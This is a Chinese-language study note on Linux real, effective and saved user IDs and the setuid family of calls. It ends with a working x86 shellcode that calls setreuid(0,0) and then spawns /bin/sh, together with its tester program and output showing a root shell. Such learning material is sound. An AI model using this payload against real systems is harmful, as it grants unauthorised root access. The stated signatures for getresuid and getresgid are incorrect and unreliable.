# uid 之 ruid，euid，suid

## 1.基本概念

* RUID：real user id，程序执行前，命令行显示的用户
* EUID：effective user id，进程当前的权限身份，决定进程可以执行哪些操作，当不具有 suid 时，与 ruid 相同，否则开始被初始化为程序的拥有者。经常在程序执行期间进行改变，以改变执行权限
* SUID：saved user id，保存的有效用户 ID，用于后续可能恢复权限的情况



## 2.权限控制函数

设置的 id 必须为系统中存在的用户 id 或组 id，用户 id 存在于/etc/passwd 文件中，而组 id 存在于/etc/group 文件中

获取用户id/组id：

```c
//这些函数都没有出错返回
#include <unistd.h>
uid_t getuid(void);     //返回：调用进程的实际用户ID
uid_t geteuid(void);    //返回：调用进程的有效用户ID
uid_t getresuid(void);  //返回：调用进程的设置用户ID
gid_t getgid(void);     //返回：调用进程的实际组ID
gid_t getegid(void);    //返回：调用进程的有效组ID
gid_t getresgid(void);  //返回：调用进程的有效组ID
```

### 2.1 setuid()

```c
int setuid(uid_t uid);
```

首先请求内核将本进程的 ruid, euid 和 suid 都设置成函数指定的 uid, 若权限不够则请求只将 effective uid 设置成 uid, 再不行则调用失败

### 2.2 seteuid()

```c
int seteuid(uid_t euid);
```

无论什么情况，它只改变进程euid，而不改变ruid和suid，仅请求内核将本进程的 euid 设置成函数指定的 uid

### 2.3 setreuid()

```c
int setreuid(uid_t ruid,uid_t euid);
```

交换id



## 3.shellcode

Linux/x86 - setreuid(0, 0) + execve("/bin/sh") Shellcode (29 bytes)：

```c
$ gcc -fno-stack-protector -z execstack shellcode_tester.c -o shellcode
shellcode_tester.c: In function ‘main’:
shellcode_tester.c:25:2: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
shellcode_tester.c:25:24: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
$ sudo chown root:root ./shellcode
$ sudo chmod u+s ./shellcode
$ ./shellcode
Length: 29
# id
uid=0(root) gid=1000(artur) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(artur)

*/

char shellcode[] = ""
	"\x31\xc0"		// clear eax, as we don't know its state
	"\xb0\x46"		// syscall setreuid
	"\x31\xdb"		// real user ID = 0
	"\x31\xc9"		// effective user ID = 0
	"\x99"			// saved set-user-ID = 0 (using EDX)
	"\xcd\x80"		// call it

	"\x96"			// clear eax, as we don't know its state after former syscall
	"\xb0\x0b"		// syscall execve
	"\x53"			// NULL string terminator
	"\x68\x2f\x2f\x73\x68"	// //sh
	"\x68\x2f\x62\x69\x6e"	// /bin
	"\x89\xe3"		// pointer to above string - path to the program to execve
	"\xcd\x80";		// call it

void main(void)
{
	printf("Length: %d\n",strlen(shellcode));
	((void(*)(void))shellcode)();
}
```

